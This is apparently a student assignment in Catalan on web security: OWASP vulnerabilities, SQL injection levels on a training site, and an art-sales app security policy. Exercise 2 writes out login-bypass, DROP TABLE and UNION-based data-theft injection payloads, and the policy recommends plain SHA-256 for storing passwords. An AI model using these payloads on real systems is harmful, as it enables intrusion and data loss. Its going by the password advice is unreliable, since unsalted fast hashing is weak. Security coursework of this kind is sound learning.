# T1.PR1 Seguretat i vulnerabilitat

## Exercici 1

<h4> Escull 3 vulnerabilitats d’aquesta llista i descriu-les. Escriu l’impacte que tenen 
a la seguretat i quins danys pot arribar a fer un atac en aquesta vulnerabilitat. Enumera 
diferents mesures i tècniques per poder evitar-les.</h4>

- <u>FALLADES CRIPTOGRÀFIQUES: </u> 

**Què són?** Dintre de la informàtica són un tipus de fallades que succeeixen quan la
criptografia, dissenyada per resguardar informació i dades mitjançant l'encriptació,
no compleix la seva funció correctament. Aquestes es poden donar per diversos motius:
per l'aplicació d'algorismes criptogràfics poc robusts o perillosos, pel mal l'ús
d'algorismes criptogràfics, per falles en l'estructura del sistema...

**Quin és el seu impacte?** Depenent del tipus de fallada dintre de les criptogràfiques
podria resultar en una pèrdua de dades, filtració d'informació confidencial, facilitació
d'invasió al sistema i, en el pitjor dels casos, una bretxa de dades a gran escala.

**Com es poden evitar?** Es poden evitar seguint els següents consells:
fer ús d'algorismes i protocols criptogràfics que tinguin el reconeixement de ser segur i
d'estar actualitzats, aplicar-los adequadament (seguint bones pràctiques), dissenyar
el sistema per a què gestioni els elements criptogràfics correctament, fer
proves periòdiques per identificar i corregir possibles fallades.

- <u>INJECCIÓ: </u>

**Què són?** Són un tipus d'atac informàtic que insereix entrades d'informació malicioses
o introdueix codi perillós mitjançant una aplicació a un altre sistema. En aquest tipus 
d'atac, els inputs o el codi maliciós són "injectats" al programa com a part d'una consulta
o una comanda.

**Quin és el seu impacte?** Un atac d'injecció exitós pot conduir a: l'obtenció per part
de l'atacant de funcionalitats del sistema de les quals no hauria de tindre accés,
l'adquisició, corrupció o eliminació dels continguts de la base de dades del sistema i,
en el pitjor dels casos, la destrucció completa del sistema.

**Com es poden evitar?** Amb l'ús d'eines com firewalls (WAFs), testejos
de la seguretat de les aplicacions amb tests unitaris i software
extern (SAST, DAST) i, com a més actual i eficient, Contrast Security (IAST). 

- <u>FALLADES D'IDENTIFICACIÓ I AUTENTICACIÓ: </u>

**Què són?** Són les fallades relacionades amb l'àrea de ciberseguretat relativa a 
_l'autenticació_ que engloba processos com tancar sessió, les preguntes de verificació,
la recuperació de contrasenyes, la funció de recordar l'usuari i la contrasenya, 
l'actualització de les dades d'una conta i altres.

**Quin és el seu impacte?** Amb aquestes fallades l'atacant guanya accés no autoritzat
a dades personals, informació de negoci privada i altres. Això condueix a una bretxa 
de privacitat, a una potencial pèrdua d'ingressos important i, a més, la reputació
de l'empresa vulnerada es veurà molt afectada.

**Com es poden evitar?** Controlant la durada de la sessió, rotant i invalidant la ID
de les sessions (referent a canviar la ID de la sessió després de certes operacions o
després de cert temps), realitzant autenticacions multi factor MFA (no només es valida
amb contrasenya) i implementar mesures de protecció de força bruta (per exemple: limitar 
el nombre d'intents d'inici de sessió o afegir CAPTCHAs).

-------------

## Exercici 2

<h4>Obre el següent enllaç ([sql inseckten](https://www.sql-insekten.de/)) i realitza un mínim 
de 7 nivells fent servir tècniques d’injecció SQL.</h4>
<h4> a) Copia cada una de les sentències SQL resultant que has realitzat a cada nivell i 
comenta que has aconseguit.</h4>

NIVELL 1 - jane';-- //S'elimina la condició del password. Permet fer login només amb l'usuari

SELECT username
FROM users
WHERE username ='jane'; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

NIVELL 2 - ' ; DROP TABLE users; -- //S'elimina la condició del password i s'afegeix una
instrucció per fer un DROP de la taula users.

SELECT username
FROM users
WHERE username =''; DROP TABLE users; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

NIVELL 3 - ' OR 0<5; -- //S'elimina la condició del password i s'afegeix una condició que
sempre és true amb un OR. D'aquesta manera deixa fer login independentment de l'usuari i
la contrasenya.

SELECT username
FROM users
WHERE username ='' OR 0<5; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

NIVELL 4 - ' OR 0<5 ORDER BY username LIMIT 1; -- //Fent referència al nivell 4, els developers han arreglat el bug de poder
fer login quan al SELECT es retornen múltiples files. Per tant, limitem el retorn a una amb LIMIT 1.

SELECT username
FROM users
WHERE username ='' OR 0<5 ORDER BY username LIMIT 1; --' AND password ='d41d8cd98f00b204e9800998ecf8427e';

NIVELL 5 - ' UNION SELECT username, password FROM users; -- //S'uneix al SELECT original el SELECT
sense condicions de la taula users que retornarà tots els usuaris i contrasenyes.

SELECT product_id, brand, size, price
FROM shoes
WHERE brand='' UNION SELECT username, password FROM users; --';

NIVELL 6 - ' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' --
//S'uneix al SELECT original el SELECT de la taula staff per saber el salary
d'una treballadora concreta

SELECT username
FROM users
WHERE username ='' UNION SELECT s.salary AS staff_salary FROM staff s WHERE s.firstname = 'Greta Maria' -- ' AND password ='d41d8cd98f00b204e9800998ecf8427e';

Nivell 7 - ' UNION SELECT name, email, salary, employed_since FROM staff --
//S'uneix al SELECT original el SELECT sense condicions de la taula staff que retornarà dades privades
sobre els treballadors

SELECT product_id, brand, size, price
FROM shoes
WHERE brand='' UNION SELECT name, email, salary, employed_since FROM staff --';

<h4> b) Enumera i raona diferents formes que pot evitar un atac per SQL injection en 
projectes fets amb Razor Pages i Entity Framework.</h4>

1. Realitzar validacions d'entrada de dades per part de client i servidor (tipus de dades
i caràcters).
2. No utilitzar SQL nadiu sinó les eines que ofereix EntityFramework combinades amb LINQ
per fer filtratge.
3. En cas de ser necessari utilitzar SQL nadiu en un cas concret, utilitzar Prepared Statement.
4. Configurar permisos i rols (certes funcionalitats només accessibles per certs rols).

-------------

## Exercici 3

<h4>L’empresa a la qual treballes desenvoluparà una aplicació web de venda d’obres 
d’art. Els artistes registren les seves obres amb fotografies, títol, descripció i preu. 
Els clients poden comprar les obres i poden escriure ressenyes públiques dels artistes 
a qui han comprat. Tant clients com artistes han d’estar registrats. L’aplicació guarda 
nom, cognoms, adreça completa, dni i telèfon. En el cas dels artistes guarda les dades 
bancàries per fer els pagaments. Hi ha un tipus d’usuari Account Manager que s’encarrega 
de verificar als nous artistes. Un cop aprovats poden públicar i vendre les seves obres.

Ara es vol aplicar aplicant els principis de seguretat per tal de garantir el servei 
i la integritat de les dades. T’han encarregat l'elaboració de part de les polítiques 
de seguretat. Elabora els següents apartats:</h4>

<h4>a) Definició del control d’accés: enumera els rols i quin accés a dades tenen cada 
rol.</h4>

1. Account Manager: Aproven nous artistes, gestionen i revisen contingut i gestionen 
els pagaments als artistes. Tenen accés directe total a la BD, però no poden modificar
les dades més vulnerables (bancàries).
2. Artistes: Pengen i gestionen les seves obres i només tenen accés a les seves dades 
personals i bancàries (no directe a la BD). 
3. Clients: Compren i pengen comentaris sobre obres i només tenen accés a les seves dades
personals (no directe a la BD).

<h4>b) Definició de la política de contrasenyes: normes de creació, d’ús i canvi de 
contrasenyes. Raona si són necessàries diferents polítiques segons el perfil d’usuari.</h4>

- CREACIÓ: Les contrasenyes haurien de tenir una longitud mínima (12 caràcters) i
haurien de contenir tota mena de caràcters; mínim una majúscula, una minúscula, un 
número i un caràcter especial.

- ÚS: Cada sessió a l'aplicació requerirà l'ús de la contrasenya per fer el login
per part de tots els rols i els artistes i account managers, com tenen informació
vulnerable a les seves contes, haurien de fer una doble autenticació 2FA.
A part, l'usuari es bloquejarà temporalment si es fan més de tres intents d'inici
de sessió no exitosos.

- CANVI: Per fer el canvi de contrasenya es requeriria un correu i un telèfon. El
canvi es faria mitjançant un link enviat al correu (que s'enviaria una vegada validat
un SMS dirigit al telèfon vinculat a l'usuari que es vol actualitzar).

<h4>c) Avaluació de la informació: determina quin valor tenen les dades que treballa 
l'aplicació. Determina com tractar les dades més sensibles. Quines dades encriptaries?</h4>

Les dades més sensibles són les següents:

- Contrasenyes: S'haurien d'encriptar abans de guardar a la BD mitjançant SHA-256.
- Dades bancàries: Són les dades que més s'haurien de protegir. Es faria
amb encriptació asimètrica.
- DNI, telèfon i adreça: També s'haurien de protegir, però no tenen tant de risc, 
per tant, s'utilitzaria encriptació simètrica.

-------------

## Exercici 4

<h4>En el control d’accessos, existeixen mètodes d’autenticació basats en tokens. Defineix 
l’autenticació basada en tokens. Quins tipus hi ha? Com funciona mitjançant la web? Cerca 
llibreries .Net que ens poden ajudar a implementar autenticació amb tokens.</h4>

- **Què és l'autenticació basada en tokens?** És el procés de verificació d'identitat
mitjançant la comprovació d'un token. Aquest últim és un element simbòlic temporal que és 
analitzat pel sistema per realitzar l'autenticació.


- **Quins tipus hi ha?** Hi ha dos tipus: autenticació per token físic o autenticació
per token digital. L'autenticació per token físic utilitza un element de hardware per accedir
a un recurs; per exemple un USB o una targeta intel·ligent.
En canvi, l'autenticació per token digital fa ús d'un missatge enivat des d'un servidor a un 
client el qual l'emmagatzema temporalment.


- **Com funcionen a la web?** Funcionen seguint 4 passos: Primer es fa una sol·licitud on
l'usuari introdueix les seves dades d'accés, després el servidor valida aquestes dades,
seguidament el servidor genera un token i s'emmagatzema al navegador web de l'usuari.
A més, el token eventualment caducarà.


- Algunes llibreries .Net d'autenticació amb tokens: System.IdentityModel.Tokens.Jwt,
Microsoft.AspNetCore.Authentication.JwtBearer i IdentityServer.


-------------

## Exercici 5 - GITHUB

<h4>Crea un projecte de consola amb un menú amb tres opcions: </h4>

<h4>a) Registre: l’usuari ha d’introduir username i una password. De la combinació dels dos 
camps guarda en memòria directament l'encriptació. Utilitza l’encriptació de hash HA256. 
Mostra per pantalla el resultat.</h4>

<h4>b) Verificació de dades: usuari ha de tornar a introduir les dades el programa 
mostra per pantalla si les dades són correctes.</h4>

<h4>c) Encriptació i desencriptació amb RSA. L’usuari entrarà un text per consola. A 
continuació mostra el text encriptat i en la següent línia el text desencriptat. 
L’algoritme de RSA necessita una clau pública per encriptar i una clau privada per 
desencriptar. No cal guardar-les en memòria persistent.</h4>

<h4>Per realitzar aquest exercici utilitza la llibreria System.Security.Cryptography.</h4>

-------------

## Exercici 6

#### Referències consultades:

Sense nom. (17/1/2025). A02: 2021 – Fallas Criptográficas OWASP. Conozca mejor este problema cibernético.
Wallarm. Recuperat el 25/3/2025 de https://lab.wallarm.com/what/a02-2021-fallas-criptograficas-owasp-conozca-mejor-este-problema-cibernetico/?lang=es


Sense nom. (Sense data). Injection Attack. Contrast Security. Recuperat el 26/3/2025 de https://www.contrastsecurity.com/glossary/injection-attack-types


Cilleruelo, Carlos. (27/5/2024). ¿Qué es Broken Authentication? Keep coding. Recuperat el 26/3/2025 de
https://keepcoding.io/blog/que-es-broken-authentication/


Marić, Nedim. (12/1/2024). Broken Authentication: Impact, Examples, and How to Fix It. Bright.
Recuperat el 26/3/2025 de https://brightsec.com/blog/broken-authentication-impact-examples-and-how-to-fix-it/


Sense nom. (Sense data). Proveedores de identidad ¿Qué es la autenticación basada en tokens? Entrust.
Recuperat el 30/3/2025 de https://www.entrust.com/es/resources/learn/what-is-token-based-authentication


Documentació llibreries:
- https://learn.microsoft.com/es-es/dotnet/architecture/maui/authentication-and-authorization
- https://quiero1app.com/blog/jwt_punto_net7_minimal_api_filtro/